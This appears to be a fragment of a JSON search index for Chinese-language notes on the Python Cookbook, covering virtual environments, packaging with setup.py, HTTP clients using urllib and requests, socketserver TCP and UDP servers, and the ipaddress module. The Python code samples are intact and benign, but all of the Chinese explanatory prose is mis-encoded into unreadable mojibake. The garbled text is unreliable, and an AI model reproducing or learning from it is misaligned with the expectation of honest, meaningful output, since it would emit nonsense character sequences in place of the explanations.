ç¯å¢ƒï¼Œç”¨æ¥å®‰è£…æ¨¡å—å’ŒåŒ…ã€‚ä¸è¿‡ï¼Œä½ ä¸æƒ³å®‰è£…ä¸€ä¸ªæ–°çš„ Python å…‹éš†ï¼Œä¹Ÿä¸æƒ³å¯¹ç³»ç»Ÿ Python ç¯å¢ƒäº§ç”Ÿå½±å“ã€‚ è§£å†³æ–¹æ¡ˆ ä½ å¯ä»¥ä½¿ç”¨ pyvenv å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„\"è™šæ‹Ÿ\"ç¯å¢ƒã€‚è¿™ä¸ªå‘½ä»¤è¢«å®‰è£…åœ¨ Python è§£é‡Šå™¨åŒä¸€ç›®å½•ï¼Œæˆ– Windows ä¸Šé¢çš„ Scripts ç›®å½•ä¸­ã€‚ ä¹¦ä¸Šæ˜¯æ—§ç‰ˆæœ¬çš„, æ–°ç‰ˆæœ¬è¿™æ ·ç”¨: python -m venv venv_3910 æœ€åä¸€ä¸ªå‚æ•°å°±æ˜¯æ–°ç¯å¢ƒçš„åç§°, æ˜¯è¦è¢«åˆ›å»ºçš„ç›®å½•å, æ³¨æ„å†™å¥½åä¸èƒ½ç§»åŠ¨ä½ç½®. è®¨è®º åˆ›å»ºè™šæ‹Ÿç¯å¢ƒé€šå¸¸æ˜¯ä¸ºäº†å®‰è£…å’Œç®¡ç†ç¬¬ä¸‰æ–¹åŒ…ã€‚æ­£å¦‚ä½ åœ¨ä¾‹å­ä¸­çœ‹åˆ°çš„é‚£æ ·ï¼Œsys. path å˜é‡åŒ…å«æ¥è‡ªäºç³»ç»Ÿ Python çš„ç›®å½•ï¼Œè€Œ site-packages ç›®å½•å·²ç»è¢«é‡å®šä½åˆ°ä¸€ä¸ª æ–°çš„ç›®å½•ã€‚ æœ‰äº†ä¸€ä¸ªæ–°çš„è™šæ‹Ÿç¯å¢ƒï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å®‰è£…ä¸€ä¸ªåŒ…ç®¡ç†å™¨ï¼Œæ¯”å¦‚ distribute æˆ– pipã€‚ ä½†å®‰è£…è¿™æ ·çš„å·¥å…·å’ŒåŒ…çš„æ—¶å€™ï¼Œä½ éœ€è¦ç¡®ä¿ä½ ä½¿ç”¨çš„æ˜¯è™šæ‹Ÿç¯å¢ƒçš„è§£é‡Šå™¨ã€‚å®ƒä¼šå°†åŒ…å®‰ è£…åˆ°æ–°åˆ›å»ºçš„ site-packages ç›®å½•ä¸­å»ã€‚ å°½ç®¡ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒçœ‹ä¸Šå»æ˜¯ Python å®‰è£…çš„ä¸€ä¸ªå¤åˆ¶ï¼Œä¸è¿‡å®ƒå®é™…ä¸ŠåªåŒ…å«äº†å°‘é‡ å‡ ä¸ªæ–‡ä»¶å’Œä¸€äº›ç¬¦å·é“¾æ¥ã€‚æ‰€æœ‰æ ‡å‡†åº“å‡½æ–‡ä»¶å’Œå¯æ‰§è¡Œè§£é‡Šå™¨éƒ½æ¥è‡ªåŸæ¥çš„ Python å®‰ è£…ã€‚å› æ­¤ï¼Œåˆ›å»ºè¿™æ ·çš„ç¯å¢ƒæ˜¯å¾ˆå®¹æ˜“çš„ï¼Œå¹¶ä¸”å‡ ä¹ä¸ä¼šæ¶ˆè€—æœºå™¨èµ„æºã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œè™šæ‹Ÿç¯å¢ƒæ˜¯ç©ºçš„ï¼Œä¸åŒ…å«ä»»ä½•é¢å¤–çš„ç¬¬ä¸‰æ–¹åº“ã€‚å¦‚æœä½ æƒ³å°†ä¸€ä¸ªå·²ç» å®‰è£…çš„åŒ…ä½œä¸ºè™šæ‹Ÿç¯å¢ƒçš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥ä½¿ç”¨\"â€“system-site-packages\"é€‰é¡¹æ¥åˆ›å»ºè™šæ‹Ÿ ç¯å¢ƒ åˆ†å‘åŒ… é—®é¢˜ ä½ å·²ç»ç¼–å†™äº†ä¸€ä¸ªæœ‰ç”¨çš„åº“ï¼Œæƒ³å°†å®ƒåˆ†äº«ç»™å…¶ä»–äºº è§£å†³æ–¹æ¡ˆ å¦‚æœä½ æƒ³åˆ†å‘ä½ çš„ä»£ç ï¼Œç¬¬ä¸€ä»¶äº‹å°±æ˜¯ç»™å®ƒä¸€ä¸ªå”¯ä¸€çš„åå­—ï¼Œå¹¶ä¸”æ¸…ç†å®ƒçš„ç›®å½•ç»“ æ„ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå…¸å‹çš„å‡½æ•°åº“åŒ…ä¼šç±»ä¼¼ä¸‹é¢è¿™æ ·: projectname/ README.txt Doc/ documentation.txt projectname/ __init__.py foo.py bar.py utils/ __init__.py spam.py grok.py examples/ helloworld.py ... è¦è®©ä½ çš„åŒ…å¯ä»¥å‘å¸ƒå‡ºå»ï¼Œé¦–å…ˆä½ è¦ç¼–å†™ä¸€ä¸ª setup.py ï¼Œç±»ä¼¼ä¸‹é¢è¿™æ ·: # setup.py from distutils.core import setup setup(name='projectname', version='1.0', author='Your Name', author_email='you@youraddress.com', url='http://www.you.com/projectname', packages=['projectname', 'projectname.utils'], ) ä¸‹ä¸€æ­¥ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ª MANIFEST.in æ–‡ä»¶ï¼Œåˆ—å‡ºæ‰€æœ‰åœ¨ä½ çš„åŒ…ä¸­éœ€è¦åŒ…å«è¿›æ¥çš„ éæºç æ–‡ä»¶: # MANIFEST.in include *.txt recursive-include examples * recursive-include Doc * ç¡®ä¿ setup.py å’Œ MANIFEST.in æ–‡ä»¶æ”¾åœ¨ä½ çš„åŒ…çš„æœ€é¡¶çº§ç›®å½•ä¸­ã€‚ä¸€æ—¦ä½ å·²ç»åš äº†è¿™äº›ï¼Œä½ å°±å¯ä»¥åƒä¸‹é¢è¿™æ ·æ‰§è¡Œå‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªæºç åˆ†å‘åŒ…äº†: % bash python3 setup.py sdist å®ƒä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ¯”å¦‚\"projectname-1.0.zip\"æˆ–\"projectname-1.0.tar.gz\", å…·ä½“ ä¾èµ–äºä½ çš„ç³»ç»Ÿå¹³å°ã€‚å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥å‘é€ç»™åˆ«äººä½¿ç”¨æˆ–è€…ä¸Šä¼ è‡³ Python Package Index. è®¨è®º å¯¹äºçº¯ Python ä»£ç ï¼Œç¼–å†™ä¸€ä¸ªæ™®é€šçš„ setup.py æ–‡ä»¶é€šå¸¸å¾ˆç®€å•ã€‚ä¸€ä¸ªå¯èƒ½çš„é—® é¢˜æ˜¯ä½ å¿…é¡»æ‰‹åŠ¨åˆ—å‡ºæ‰€æœ‰æ„æˆåŒ…æºç çš„å­ç›®å½•ã€‚ä¸€ä¸ªå¸¸è§é”™è¯¯å°±æ˜¯ä»…ä»…åªåˆ—å‡ºä¸€ä¸ªåŒ… çš„æœ€é¡¶çº§ç›®å½•ï¼Œå¿˜è®°äº†åŒ…å«åŒ…çš„å­ç»„ä»¶ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨ setup.py ä¸­å¯¹äºåŒ…çš„è¯´æ˜åŒ… å«äº†åˆ—è¡¨ packages=['projectname', 'projectname.utils'] æœ‰å¾ˆå¤šç¬¬ä¸‰æ–¹åŒ…ç®¡ç†å™¨ä¾›é€‰æ‹©ï¼ŒåŒ…æ‹¬ setuptoolsã€ distribute ç­‰ç­‰ã€‚æœ‰äº›æ˜¯ä¸ºäº†æ›¿ä»£æ ‡å‡†åº“ä¸­çš„ distutilsã€‚æ³¨æ„å¦‚æœä½ ä¾èµ–è¿™äº›åŒ…ï¼Œç”¨æˆ·å¯ èƒ½ä¸èƒ½å®‰è£…ä½ çš„è½¯ä»¶ï¼Œé™¤éä»–ä»¬å·²ç»äº‹å…ˆå®‰è£…è¿‡æ‰€éœ€è¦çš„åŒ…ç®¡ç†å™¨ã€‚æ­£å› å¦‚æ­¤ï¼Œä½ æ›´åº” è¯¥æ—¶åˆ»è®°ä½è¶Šç®€å•è¶Šå¥½çš„é“ç†ã€‚æœ€å¥½è®©ä½ çš„ä»£ç ä½¿ç”¨æ ‡å‡†çš„ Python 3 å®‰è£…ã€‚å¦‚æœå…¶ä»– åŒ…ä¹Ÿéœ€è¦çš„è¯ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªå¯é€‰é¡¹æ¥æ”¯æŒã€‚ å¯¹äºæ¶‰åŠåˆ° C æ‰©å±•çš„ä»£ç æ‰“åŒ…ä¸åˆ†å‘å°±æ›´å¤æ‚ç‚¹äº†ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Module-and-package.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Module-and-package.html"},{"title":"ç½‘ç»œä¸ Web ç¼–ç¨‹","text":"æœ¬ç« æ˜¯å…³äºåœ¨ç½‘ç»œåº”ç”¨å’Œåˆ†å¸ƒå¼åº”ç”¨ä¸­ä½¿ç”¨çš„å„ç§ä¸»é¢˜ã€‚ä¸»é¢˜åˆ’åˆ†ä¸ºä½¿ç”¨ Python ç¼–å†™å®¢æˆ·ç«¯ç¨‹åºæ¥è®¿é—®å·²æœ‰çš„æœåŠ¡ï¼Œä»¥åŠä½¿ç”¨ Python å®ç°ç½‘ç»œæœåŠ¡ç«¯ç¨‹åºã€‚ä¹Ÿç»™å‡ºäº† ä¸€äº›å¸¸è§çš„æŠ€æœ¯ï¼Œç”¨äºç¼–å†™æ¶‰åŠååŒæˆ–é€šä¿¡çš„çš„ä»£ç ã€‚ ä½œä¸ºå®¢æˆ·ç«¯ä¸ HTTP æœåŠ¡äº¤äº’ é—®é¢˜ ä½ éœ€è¦é€šè¿‡ HTTP åè®®ä»¥å®¢æˆ·ç«¯çš„æ–¹å¼è®¿é—®å¤šç§æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œä¸‹è½½æ•°æ®æˆ–è€…ä¸åŸº äº REST çš„ API è¿›è¡Œäº¤äº’ã€‚ è§£å†³æ–¹æ¡ˆ å¯¹äºç®€å•çš„äº‹æƒ…æ¥è¯´ï¼Œé€šå¸¸ä½¿ç”¨ urllib.request æ¨¡å—å°±å¤Ÿäº†ã€‚ä¾‹å¦‚ï¼Œå‘é€ä¸€ä¸ªç®€ å•çš„ HTTP GET è¯·æ±‚åˆ°è¿œç¨‹çš„æœåŠ¡ä¸Šï¼Œå¯ä»¥è¿™æ ·åš: from urllib import request, parse # Base URL being accessed url = 'http://httpbin.org/get' # Dictionary of query parameters (if any) parms = { 'name1' : 'value1', 'name2' : 'value2' } # Encode the query string querystring = parse.urlencode(parms) # Make a GET request and read the response u = request.urlopen(url+'?' + querystring) resp = u.read() å¦‚æœä½ éœ€è¦ä½¿ç”¨ POST æ–¹æ³•åœ¨è¯·æ±‚ä¸»ä½“ä¸­å‘é€æŸ¥è¯¢å‚æ•°ï¼Œå¯ä»¥å°†å‚æ•°ç¼–ç åä½œä¸º å¯é€‰å‚æ•°æä¾›ç»™ urlopen() å‡½æ•°ï¼Œå°±åƒè¿™æ ·: # Make a POST request and read the response u = request.urlopen(url, querystring.encode('ascii')) resp = u.read() å¦‚æœä½ éœ€è¦åœ¨å‘å‡ºçš„è¯·æ±‚ä¸­æä¾›ä¸€äº›è‡ªå®šä¹‰çš„ HTTP å¤´ï¼Œä¾‹å¦‚ä¿®æ”¹ user-agent å­— æ®µ, å¯ä»¥åˆ›å»ºä¸€ä¸ªåŒ…å«å­—æ®µå€¼çš„å­—å…¸ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª Request å®ä¾‹ç„¶åå°†å…¶ä¼ ç»™ urlopen() ï¼Œå¦‚ä¸‹: from urllib import request, parse ... # Extra headers headers = { 'User-agent' : 'none/ofyourbusiness', 'Spam' : 'Eggs' } req = request.Request(url, querystring.encode('ascii'), headers=headers) # Make a request and read the response u = request.urlopen(req) resp = u.read() å¦‚æœéœ€è¦äº¤äº’çš„æœåŠ¡æ¯”ä¸Šé¢çš„ä¾‹å­éƒ½è¦å¤æ‚ï¼Œä¹Ÿè®¸åº”è¯¥å»çœ‹çœ‹ requests åº“: resp = requests.post(url, data=parms, headers=headers) å…³äº requests åº“ï¼Œä¸€ä¸ªå€¼å¾—ä¸€æçš„ç‰¹æ€§å°±æ˜¯å®ƒèƒ½ä»¥å¤šç§æ–¹å¼ä»è¯·æ±‚ä¸­è¿”å›å“åº”ç»“ æœçš„å†…å®¹ã€‚ resp.text å¸¦ç»™æˆ‘ä»¬çš„æ˜¯ä»¥ Unicode è§£ç çš„å“åº”æ–‡æœ¬ resp.content ï¼Œå°±ä¼šå¾—åˆ°åŸå§‹çš„äºŒè¿›åˆ¶æ•°æ® resp.json ï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ° JSON æ ¼å¼çš„å“åº”å†…å®¹ åˆ©ç”¨ requests é€šè¿‡åŸºæœ¬è®¤è¯ç™»å½• Pypi import requests resp = requests.get('http://pypi.python.org/pypi?:action=login', auth=('user','password')) åˆ©ç”¨ requests å°† HTTP cookies ä»ä¸€ä¸ªè¯·æ±‚ä¼ é€’åˆ°å¦ä¸€ä¸ªçš„ä¾‹å­: import requests # First request resp1 = requests.get(url) ... # Second requests with cookies received on first requests resp2 = requests.get(url, cookies=resp1.cookies) æœ€åä½†å¹¶éæœ€ä¸é‡è¦çš„ä¸€ä¸ªä¾‹å­æ˜¯ç”¨ requests ä¸Šä¼ å†…å®¹: import requests url = 'http://httpbin.org/post' files = { 'file': ('data.csv', open('data.csv', 'rb')) } r = requests.post(url, files=files) è®¨è®º å¯¹äºçœŸçš„å¾ˆç®€å• HTTP å®¢æˆ·ç«¯ä»£ç ï¼Œç”¨å†…ç½®çš„ urllib æ¨¡å—é€šå¸¸å°±è¶³å¤Ÿäº†ã€‚ä½†æ˜¯ï¼Œ å¦‚æœä½ è¦åšçš„ä¸ä»…ä»…åªæ˜¯ç®€å•çš„ GET æˆ– POST è¯·æ±‚ï¼Œé‚£å°±çœŸçš„ä¸èƒ½å†ä¾èµ–å®ƒçš„åŠŸèƒ½ äº†ã€‚è¿™æ—¶å€™å°±æ˜¯ç¬¬ä¸‰æ–¹æ¨¡å—æ¯”å¦‚ requests å¤§æ˜¾èº«æ‰‹çš„æ—¶å€™äº†ã€‚ request åº“è¿˜å¯¹è®¸å¤šé«˜çº§çš„ HTTP å®¢æˆ·ç«¯åè®®æä¾›äº†æ”¯æŒï¼Œ æ¯”å¦‚ OAuthã€‚requests æ¨¡å—çš„æ–‡æ¡£ï¼ˆ http://docs.python-requests.org ) è´¨é‡å¾ˆé«˜ åˆ›å»º TCP æœåŠ¡å™¨ é—®é¢˜ ä½ æƒ³å®ç°ä¸€ä¸ªæœåŠ¡å™¨ï¼Œé€šè¿‡ TCP åè®®å’Œå®¢æˆ·ç«¯é€šä¿¡ã€‚ è§£å†³æ–¹æ¡ˆ åˆ›å»ºä¸€ä¸ª TCP æœåŠ¡å™¨çš„ä¸€ä¸ªç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ socketserver åº“ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ ä¸ªç®€å•çš„åº”ç­”æœåŠ¡å™¨: from socketserver import BaseRequestHandler, TCPServer class EchoHandler(BaseRequestHandler): def handle(self): print('Got connection from', self.client_address) while True: msg = self.request.recv(8192) if not msg: break self.request.send(msg) if __name__ == '__main__': serv = TCPServer(('', 20000), EchoHandler) serv.serve_forever() ä½¿ç”¨å¦ä¸€ä¸ªå®¢æˆ·ç«¯æµ‹è¯•: >>> from socket import socket, AF_INET, SOCK_STREAM >>> s = socket(AF_INET, SOCK_STREAM) >>> s.connect(('localhost', 20000)) >>> s.send(b'Hello') 5 >>> s.recv(8192) b'Hello' >>> å¾ˆ å¤š æ—¶ å€™ï¼Œ å¯ ä»¥ å¾ˆ å®¹ æ˜“ çš„ å®š ä¹‰ ä¸€ ä¸ª ä¸ åŒ çš„ å¤„ ç† å™¨ã€‚ ä¸‹ é¢ æ˜¯ ä¸€ ä¸ª ä½¿ ç”¨ StreamRequestHandler åŸºç±»å°†ä¸€ä¸ªç±»æ–‡ä»¶æ¥å£æ”¾ç½®åœ¨åº•å±‚ socket ä¸Šçš„ä¾‹å­: from socketserver import StreamRequestHandler, TCPServer class EchoHandler(StreamRequestHandler): def handle(self): print('Got connection from', self.client_address) # self.rfile is a file-like object for reading for line in self.rfile: # self.wfile is a file-like object for writing self.wfile.write(line) if __name__ == '__main__': serv = TCPServer(('', 20000), EchoHandler) serv.serve_forever() è®¨è®º socketserver å¯ä»¥è®©æˆ‘ä»¬å¾ˆå®¹æ˜“çš„åˆ›å»ºç®€å•çš„ TCP æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œä½ éœ€è¦æ³¨æ„ çš„æ˜¯ï¼Œé»˜è®¤æƒ…å†µä¸‹è¿™ç§æœåŠ¡å™¨æ˜¯å•çº¿ç¨‹çš„ï¼Œä¸€æ¬¡åªèƒ½ä¸ºä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥æœåŠ¡ã€‚å¦‚æœä½ æƒ³ å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯ï¼Œå¯ä»¥åˆå§‹åŒ–ä¸€ä¸ª ForkingTCPServer æˆ–è€…æ˜¯ ThreadingTCPServer å¯¹ è±¡ã€‚ä¾‹å¦‚: from socketserver import ThreadingTCPServer if __name__ == '__main__': serv = ThreadingTCPServer(('', 20000), EchoHandler) serv.serve_forever() ä½¿ç”¨ fork æˆ–çº¿ç¨‹æœåŠ¡å™¨æœ‰ä¸ªæ½œåœ¨é—®é¢˜å°±æ˜¯å®ƒä»¬ä¼šä¸ºæ¯ä¸ªå®¢æˆ·ç«¯è¿æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ è¿›ç¨‹æˆ–çº¿ç¨‹ã€‚ç”±äºå®¢æˆ·ç«¯è¿æ¥æ•°æ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼Œå› æ­¤ä¸€ä¸ªæ¶æ„çš„é»‘å®¢å¯ä»¥åŒæ—¶å‘é€å¤§é‡ çš„è¿æ¥è®©ä½ çš„æœåŠ¡å™¨å¥”æºƒã€‚ å¦‚æœä½ æ‹…å¿ƒè¿™ä¸ªé—®é¢˜ï¼Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªé¢„å…ˆåˆ†é…å¤§å°çš„å·¥ä½œçº¿ç¨‹æ± æˆ–è¿›ç¨‹æ± ã€‚ä½ å…ˆ åˆ›å»ºä¸€ä¸ªæ™®é€šçš„éçº¿ç¨‹æœåŠ¡å™¨ï¼Œç„¶ååœ¨ä¸€ä¸ªçº¿ç¨‹æ± ä¸­ä½¿ç”¨ serve_forever() æ–¹æ³•æ¥å¯ åŠ¨å®ƒä»¬: from threading import Thread NWORKERS = 16 serv = TCPServer(('', 20000), EchoHandler) for n in range(NWORKERS): t = Thread(target=serv.serve_forever) t.daemon = True t.start() serv.serve_forever() ä¸€èˆ¬æ¥è®²ï¼Œä¸€ä¸ª TCPServer åœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼šç»‘å®šå¹¶æ¿€æ´»ç›¸åº”çš„ socket ã€‚ä¸è¿‡ï¼Œæœ‰æ—¶å€™ä½ æƒ³é€šè¿‡è®¾ç½®æŸäº›é€‰é¡¹å»è°ƒæ•´åº•ä¸‹çš„ socketâ€˜ ï¼Œå¯ä»¥è®¾ç½®å‚æ•° bind_and_activate=False ã€‚å¦‚ä¸‹: serv = TCPServer(('', 20000), EchoHandler, bind_and_activate=False) # Set up various socket options serv.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True) # Bind and activate serv.server_bind() serv.server_activate() serv.serve_forever() ä¸Šé¢çš„ socket é€‰é¡¹æ˜¯ä¸€ä¸ªéå¸¸æ™®éçš„é…ç½®é¡¹ï¼Œå®ƒå…è®¸æœåŠ¡å™¨é‡æ–°ç»‘å®šä¸€ä¸ªä¹‹å‰ä½¿ ç”¨è¿‡çš„ç«¯å£å·ã€‚ç”±äºè¦è¢«ç»å¸¸ä½¿ç”¨åˆ°ï¼Œå®ƒè¢«æ”¾ç½®åˆ°ç±»å˜é‡ä¸­ï¼Œå¯ä»¥ç›´æ¥åœ¨ TCPServer ä¸Š é¢è®¾ç½®ã€‚åœ¨å®ä¾‹åŒ–æœåŠ¡å™¨çš„æ—¶å€™å»è®¾ç½®å®ƒçš„å€¼ï¼Œå¦‚ä¸‹æ‰€ç¤º: TCPServer.allow_reuse_address = True serv = TCPServer(('', 20000), EchoHandler) serv.serve_forever() åœ¨ä¸Šé¢ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æ¼”ç¤ºäº†ä¸¤ç§ä¸åŒçš„å¤„ç†å™¨åŸºç±»ï¼ˆBaseRequestHandler å’Œ StreamRequestHandler ï¼‰ã€‚StreamRequestHandler æ›´åŠ çµæ´»ç‚¹ï¼Œèƒ½é€šè¿‡è®¾ç½®å…¶ä»–çš„ç±» å˜é‡æ¥æ”¯æŒä¸€äº›æ–°çš„ç‰¹æ€§ã€‚ æœ€åï¼Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯å·¨å¤§éƒ¨åˆ† Python çš„é«˜å±‚ç½‘ç»œæ¨¡å—ï¼ˆæ¯”å¦‚ HTTPã€XML-RPC ç­‰ï¼‰éƒ½æ˜¯å»ºç«‹åœ¨ socketserver åŠŸèƒ½ä¹‹ä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç›´æ¥ä½¿ç”¨ socket åº“æ¥å®ç°æœåŠ¡ å™¨ä¹Ÿå¹¶ä¸æ˜¯å¾ˆéš¾ã€‚ åˆ›å»º UDP æœåŠ¡å™¨ é—®é¢˜ ä½ æƒ³å®ç°ä¸€ä¸ªåŸºäº UDP åè®®çš„æœåŠ¡å™¨æ¥ä¸å®¢æˆ·ç«¯é€šä¿¡ã€‚ è§£å†³æ–¹æ¡ˆ è·Ÿ TCP ä¸€æ ·ï¼ŒUDP æœåŠ¡å™¨ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨ socketserver åº“å¾ˆå®¹æ˜“çš„è¢«åˆ›å»ºã€‚ä¾‹ å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ—¶é—´æœåŠ¡å™¨: from socketserver import BaseRequestHandler, UDPServer import time class TimeHandler(BaseRequestHandler): def handle(self): print('Got connection from', self.client_address) # Get message and client socket msg, sock = self.request resp = time.ctime() sock.sendto(resp.encode('ascii'), self.client_address) if __name__ == '__main__': serv = UDPServer(('', 20000), TimeHandler) serv.serve_forever() æ¥æµ‹è¯•ä¸‹è¿™ä¸ªæœåŠ¡å™¨: >>> from socket import socket, AF_INET, SOCK_DGRAM >>> s = socket(AF_INET, SOCK_DGRAM) >>> s.sendto(b'', ('localhost', 20000)) 0 >>> s.recvfrom(8192) (b'Wed Aug 15 20:35:08 2012', ('127.0.0.1', 20000)) >>> è®¨è®º ä¸€ä¸ªå…¸å‹çš„ UDP æœåŠ¡å™¨æ¥æ”¶åˆ°è¾¾çš„æ•°æ®æŠ¥ (æ¶ˆæ¯) å’Œå®¢æˆ·ç«¯åœ°å€ã€‚å¦‚æœæœåŠ¡å™¨éœ€ è¦åšåº”ç­”ï¼Œå®ƒè¦ç»™å®¢æˆ·ç«¯å›å‘ä¸€ä¸ªæ•°æ®æŠ¥ã€‚å¯¹äºæ•°æ®æŠ¥çš„ä¼ é€ï¼Œä½ åº”è¯¥ä½¿ç”¨ socket çš„ sendto() å’Œ recvfrom() æ–¹æ³•ã€‚å°½ç®¡ä¼ ç»Ÿçš„ send() å’Œ recv() ä¹Ÿå¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœï¼Œ ä½†æ˜¯å‰é¢çš„ä¸¤ä¸ªæ–¹æ³•å¯¹äº UDP è¿æ¥è€Œè¨€æ›´æ™®éã€‚ ç”±äºæ²¡æœ‰åº•å±‚çš„è¿æ¥ï¼ŒUPD æœåŠ¡å™¨ç›¸å¯¹äº TCP æœåŠ¡å™¨æ¥è®²å®ç°èµ·æ¥æ›´åŠ ç®€å•ã€‚ä¸ è¿‡ï¼ŒUDP å¤©ç”Ÿæ˜¯ä¸å¯é çš„ï¼ˆå› ä¸ºé€šä¿¡æ²¡æœ‰å»ºç«‹è¿æ¥ï¼Œæ¶ˆæ¯å¯èƒ½ä¸¢å¤±ï¼‰ã€‚å› æ­¤éœ€è¦ç”±ä½ è‡ª å·±æ¥å†³å®šè¯¥æ€æ ·å¤„ç†ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µã€‚ é€šå¸¸æ¥ è¯´ï¼Œå¦‚æœå¯é æ€§å¯¹äºä½ ç¨‹åºå¾ˆé‡è¦ï¼Œä½ éœ€è¦å€ŸåŠ©äºåºåˆ—å·ã€é‡è¯•ã€è¶…æ—¶ä»¥åŠä¸€äº›å…¶ä»–æ–¹ æ³•æ¥ä¿è¯ã€‚UDP é€šå¸¸è¢«ç”¨åœ¨é‚£äº›å¯¹äºå¯é ä¼ è¾“è¦æ±‚ä¸æ˜¯å¾ˆé«˜çš„åœºåˆã€‚ä¾‹å¦‚ï¼Œåœ¨å®æ—¶åº” ç”¨å¦‚å¤šåª’ä½“æµä»¥åŠæ¸¸æˆé¢†åŸŸï¼Œæ— éœ€è¿”å›æ¢å¤ä¸¢å¤±çš„æ•°æ®åŒ…ï¼ˆç¨‹åºåªéœ€ç®€å•çš„å¿½ç•¥å®ƒå¹¶ ç»§ç»­å‘å‰è¿è¡Œï¼‰ã€‚ UDPServer ç±»æ˜¯å•çº¿ç¨‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€æ¬¡åªèƒ½ä¸ºä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥æœåŠ¡ã€‚å®é™…ä½¿ç”¨ ä¸­ï¼Œè¿™ä¸ªæ— è®ºæ˜¯å¯¹äº UDP è¿˜æ˜¯ TCP éƒ½ä¸æ˜¯ä»€ä¹ˆå¤§é—®é¢˜ã€‚å¦‚æœä½ æƒ³è¦å¹¶å‘æ“ä½œï¼Œå¯ä»¥ å®ä¾‹åŒ–ä¸€ä¸ª ForkingUDPServer æˆ– ThreadingUDPServer å¯¹è±¡ é€šè¿‡ CIDR åœ°å€ç”Ÿæˆå¯¹åº”çš„ IP åœ°å€é›† é—®é¢˜ ä½ æœ‰ä¸€ä¸ª CIDR ç½‘ç»œåœ°å€æ¯”å¦‚\"123.45.67.89/27\"ï¼Œä½ æƒ³å°†å…¶è½¬æ¢æˆå®ƒæ‰€ä»£è¡¨çš„æ‰€ æœ‰ IP ï¼ˆæ¯”å¦‚ï¼Œ\"123.45.67.64\", \"123.45.67.65\", â€¦, \"123.45.67.95\")ï¼‰ è§£å†³æ–¹æ¡ˆ å¯ä»¥ä½¿ç”¨ ipaddress æ¨¡å—å¾ˆå®¹æ˜“çš„å®ç°è¿™æ ·çš„è®¡ç®—ã€‚ä¾‹å¦‚: >>> import ipaddress >>> net = ipaddress.ip_network('123.45.67.64/27') >>> net IPv4Network('123.45.67.64/27') >>> for a in net: ... print(a) ... 123.45.67.64 123.45.67.65 123.45.67.66 123.45.67.67 123.45.67.68 ... 123.45.67.95 >>> >>> net6 = ipaddress.ip_network('12:3456:78:90ab:cd:ef01:23:30/125') >>> net6 IPv6Network('12:3456:78:90ab:cd:ef01:23:30/125') >>> for a in net6: ... print(a) ... 12:3456:78:90ab:cd:ef01:23:30 12:3456:78:90ab:cd:ef01:23:31 12:3456:78:90ab:cd:ef01:23:32 12:3456:78:90ab:cd:ef01:23:33 12:3456:78:90ab:cd:ef01:23:34 12:3456:78:90ab:cd:ef01:23:35 12:3456:78:90ab:cd:ef01:23:36 12:3456:78:90ab:cd:ef01:23:37 >>> Network ä¹Ÿå…è®¸åƒæ•°ç»„ä¸€æ ·çš„ç´¢å¼•å–å€¼ è¿˜å¯ä»¥æ‰§è¡Œç½‘ç»œæˆå‘˜æ£€æŸ¥ä¹‹ç±»çš„æ“ä½œ: >>> a = ipaddress.ip_address('123.45.67.69') >>> a in net True >>> b = ipaddress.ip_address('123.45.67.123') >>> b in net False ä¸€ä¸ª IP åœ°å€å’Œç½‘ç»œåœ°å€èƒ½é€šè¿‡ä¸€ä¸ª IP æ¥å£æ¥æŒ‡å®šï¼Œä¾‹å¦‚: >>> inet = ipaddress.ip_interface('123.45.67.73/27') >>> inet.network IPv4Network('123.45.67.64/27') >>> inet.ip IPv4Address('123.45.67.73') >>> è®¨è®º ipaddress æ¨¡å—æœ‰å¾ˆå¤šç±»å¯ä»¥è¡¨ç¤º IP åœ°å€ã€ç½‘ç»œå’Œæ¥å£ã€‚å½“ä½ éœ€è¦æ“ä½œç½‘ç»œåœ°å€ ï¼ˆæ¯”å¦‚è§£æã€æ‰“å°ã€éªŒè¯ç­‰ï¼‰çš„æ—¶å€™ä¼šå¾ˆæœ‰ç”¨ã€‚ è¦æ³¨æ„çš„æ˜¯ï¼Œipaddress æ¨¡å—è·Ÿå…¶ä»–ä¸€äº›å’Œç½‘ç»œç›¸å…³çš„æ¨¡å—æ¯”å¦‚ socket åº“äº¤é›†å¾ˆ å°‘ã€‚æ‰€ä»¥ï¼Œä½ ä¸èƒ½ä½¿ç”¨ IPv4Address çš„å®ä¾‹æ¥ä»£æ›¿ä¸€ä¸ªåœ°å€å­—ç¬¦ä¸²ï¼Œä½ 